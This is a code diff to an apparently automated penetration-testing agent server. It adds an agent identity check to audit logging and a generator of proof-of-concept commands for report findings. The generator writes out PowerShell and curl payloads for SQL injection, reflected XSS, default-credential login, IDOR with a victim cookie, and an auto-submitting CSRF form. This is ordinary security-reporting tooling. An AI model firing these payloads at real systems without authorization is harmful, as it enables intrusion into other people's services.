@@ -195,6 +195,32 @@ def _audit_log(session_id: str, tool_name: str, params_summary: dict, result_sum
         "read_skill", "retrieve_knowledge", "get_cross_session_insights"
     }
     if session_id and tool_name not in _INTENT_EXEMPT:
+        # OpenA2A card verification — Layer 3 identity check
+        # Maps tool to its owning agent type then verifies that agent's card
+        try:
+            from core.opena2a import AGENT_MANIFEST, verify_card
+            _agent_type = "orchestrator"
+            for _at, _adef in AGENT_MANIFEST.items():
+                if tool_name in _adef.get("capabilities", []):
+                    _agent_type = _at
+                    break
+            _card_ok, _card_msg = verify_card(_agent_type)
+            if not _card_ok:
+                engine.log_intent_event(
+                    session_id=session_id,
+                    tool_name=tool_name,
+                    session_phase="unknown",
+                    agent_type=_agent_type,
+                    parameters_summary=json.dumps(params_summary)[:200],
+                    mast_classification="UNAUTHORIZED_CHAIN",
+                    response_taken="log",
+                    severity="critical"
+                )
+                logger.warning(
+                    f"OpenA2A card invalid for {_agent_type}/{tool_name}: {_card_msg}"
+                )
+        except Exception as _a2a_err:
+            logger.debug(f"OpenA2A check skipped: {_a2a_err}")
         try:
             active_intent = engine.get_active_intent(session_id)
             if active_intent is None:
@@ -498,17 +524,19 @@ def add_injection_point(session_id: str, parameter: str, endpoint: str,
 def add_finding(session_id: str, title: str, severity: str = "medium",
                 endpoint: str = "", evidence: str = "", cvss: str = "",
                 remediation: str = "", branch_id: str = "",
-                attack_type: str = "general") -> dict:
+                attack_type: str = "general", poc_command: str = "") -> dict:
     """Record a confirmed vulnerability. Triggers MCTS backprop with reward=1.0.
     branch_id: optional — pass the branch_node_id returned by set_branch() to pin
     this finding to your specific branch. Required for correct attribution when
-    running as a parallel subtask alongside other agents."""
+    running as a parallel subtask alongside other agents.
+    poc_command: optional — custom PoC command string; auto-generated from title+endpoint if omitted."""
     if not _check_rate_limit(session_id):
         return _err("Rate limit exceeded.")
     try:
         finding_id = engine.add_finding(session_id, title, severity, endpoint,
                                          evidence, cvss, remediation,
-                                         branch_id=branch_id if branch_id else None)
+                                         branch_id=branch_id if branch_id else None,
+                                         poc_command=poc_command)
         mcts = get_or_create_mcts(session_id)
         mcts.backpropagate(attack_type, 1.0, {"title": title, "severity": severity})
         record_outcome(engine.get_fingerprint(session_id), attack_type, True)
@@ -1914,6 +1942,56 @@ def shell_exec(command: str, working_dir: str = "") -> dict:
         return _err(str(e))
 
 
+def _generate_poc(title: str, severity: str, endpoint: str, evidence: str):
+    """Return (powershell_cmd, curl_cmd) for a finding based on title keywords."""
+    title_lower = title.lower()
+    ep = endpoint or "TARGET_URL"
+
+    if any(x in title_lower for x in ['sqli', 'sql injection', 'injection']):
+        ps = f'Invoke-WebRequest -Uri "{ep}" -Method POST -Body "username=admin\'--&password=x" -UseBasicParsing'
+        cu = f"curl -s -X POST \"{ep}\" --data \"username=admin'--&password=x\" -v"
+
+    elif any(x in title_lower for x in ['xss', 'cross-site scripting', 'reflected']):
+        ps = f'Invoke-WebRequest -Uri "{ep}?q=<script>alert(document.domain)</script>" -UseBasicParsing'
+        cu = f'curl -s "{ep}?q=<script>alert(document.domain)</script>"'
+
+    elif any(x in title_lower for x in ['auth bypass', 'authentication bypass', 'default cred']):
+        ps = f'Invoke-WebRequest -Uri "{ep}" -Method POST -Body "username=admin&password=admin" -UseBasicParsing'
+        cu = f'curl -s -X POST "{ep}" --data "username=admin&password=admin" -c cookies.txt -v'
+
+    elif any(x in title_lower for x in ['idor', 'insecure direct object']):
+        ps = f'Invoke-WebRequest -Uri "{ep}" -Headers @{{Cookie="JSESSIONID=VICTIM_TOKEN"}} -UseBasicParsing'
+        cu = f'curl -s "{ep}" -H "Cookie: JSESSIONID=VICTIM_TOKEN" -v'
+
+    elif any(x in title_lower for x in ['csrf', 'cross-site request forgery']):
+        ps = (f'# CSRF PoC — save as csrf_poc.html and open in browser\n'
+              f'$html = \'<form action="{ep}" method="POST"><input name="amount" value="9999"/>'
+              f'<input type="submit"/></form><script>document.forms[0].submit()</script>\'\n'
+              f'$html | Out-File csrf_poc.html\nStart-Process csrf_poc.html')
+        cu = f'curl -s -X POST "{ep}" --data "amount=9999" -H "Origin: http://evil.com" -v'
+
+    elif any(x in title_lower for x in ['session fixation', 'session']):
+        ps = (f'# Step 1: Get session\n'
+              f'$r = Invoke-WebRequest -Uri "{ep}" -SessionVariable s -UseBasicParsing\n'
+              f'# Step 2: Authenticate with known session ID\n'
+              f'Invoke-WebRequest -Uri "{ep}/login" -Method POST -Body "username=admin&password=admin" -WebSession $s -UseBasicParsing')
+        cu = f'curl -s -c cookies.txt "{ep}"\ncurl -s -X POST "{ep}/login" --data "username=admin&password=admin" -b cookies.txt -v'
+
+    elif any(x in title_lower for x in ['missing header', 'security header', 'hsts', 'csp', 'x-frame']):
+        ps = f'(Invoke-WebRequest -Uri "{ep}" -UseBasicParsing).Headers | Format-Table'
+        cu = f'curl -s -I "{ep}" | grep -i "security\\|hsts\\|csp\\|frame\\|content-type"'
+
+    elif any(x in title_lower for x in ['swagger', 'exposed panel', 'admin panel']):
+        ps = f'Invoke-WebRequest -Uri "{ep}" -UseBasicParsing | Select-Object StatusCode,Content'
+        cu = f'curl -s "{ep}" -v'
+
+    else:
+        ps = f'Invoke-WebRequest -Uri "{ep}" -UseBasicParsing -Verbose'
+        cu = f'curl -s -v "{ep}"'
+
+    return ps, cu
+
+
 @mcp.tool()
 def generate_report(session_id: str) -> dict:
     """Generate a standalone HTML pentest report for the session."""
@@ -1971,16 +2049,13 @@ def generate_report(session_id: str) -> dict:
             evidence = DagSanitiser.sanitise_evidence(f.get("evidence", ""))
             remediation = f.get("remediation", "See OWASP guidance.")
             impact = IMPACT_MAP.get(sev, IMPACT_MAP["medium"])
-            cvss_score = ""
-            if cvss and "/" in cvss:
-                # Try to extract numeric score from vector
-                parts = cvss.split("/")
-                if len(parts) >= 6:
-                    try:
-                        # Rough CVSS base estimate from vector (simplified)
-                        cvss_score = ""
-                    except Exception:
-                        pass
+            stored_poc = f.get("poc_command", "")
+            if stored_poc:
+                ps_cmd = stored_poc
+                curl_cmd = stored_poc
+            else:
+                ps_cmd, curl_cmd = _generate_poc(title, sev, endpoint, f.get("evidence", ""))
+            fid = f"poc-{idx}"
             return f"""
 <div class="finding-card" id="finding-{idx}">
   <div class="finding-header sev-bg-{sev}">
@@ -1996,8 +2071,15 @@ def generate_report(session_id: str) -> dict:
       <div class="fg-val"><code>{endpoint}</code></div>
       <div class="fg-label">Evidence Summary</div>
       <div class="fg-val">{evidence or "Tool-confirmed via automated probe."}</div>
-      <div class="fg-label">Proof of Concept</div>
-      <div class="fg-val"><code>curl -s "{endpoint}" -X POST -d "param=[PAYLOAD]" -v</code></div>
+    </div>
+    <div class="finding-section poc-block">
+      <div class="fsec-title">Proof of Concept</div>
+      <div class="poc-label">PowerShell</div>
+      <pre class="poc-code" id="poc-ps-{fid}">{ps_cmd}</pre>
+      <button class="poc-copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('poc-ps-{fid}').innerText)">Copy PowerShell</button>
+      <div class="poc-label" style="margin-top:8px">curl</div>
+      <pre class="poc-code" id="poc-curl-{fid}">{curl_cmd}</pre>
+      <button class="poc-copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('poc-curl-{fid}').innerText)">Copy curl</button>
     </div>
     <div class="finding-section">
       <div class="fsec-title">Business Impact</div>
@@ -2147,6 +2229,17 @@ def generate_report(session_id: str) -> dict:
   .finding-section {{ margin-top: 12px; }}
   .fsec-title {{ font-weight: 700; font-size: 0.82em; color: #718096;
                  text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px; }}
+  .poc-block {{ background: #f7fafc; border: 1px solid #e2e8f0; border-radius: 6px;
+                padding: 10px 14px; margin-top: 12px; }}
+  .poc-label {{ font-size: 0.78em; font-weight: 600; color: #718096;
+                text-transform: uppercase; letter-spacing: 0.4px; margin-bottom: 3px; }}
+  .poc-code {{ background: #1a202c; color: #68d391; font-family: 'Consolas', monospace;
+               font-size: 0.82em; padding: 8px 10px; border-radius: 4px;
+               white-space: pre-wrap; word-break: break-all; margin: 0 0 4px; }}
+  .poc-copy-btn {{ font-size: 0.75em; background: #2d3748; color: #e2e8f0;
+                   border: none; border-radius: 3px; padding: 2px 8px;
+                   cursor: pointer; margin-bottom: 4px; }}
+  .poc-copy-btn:hover {{ background: #4a5568; }}
   code {{
     background: #f7fafc; border: 1px solid #e2e8f0; padding: 2px 6px;
     border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.85em; color: #2d3748;
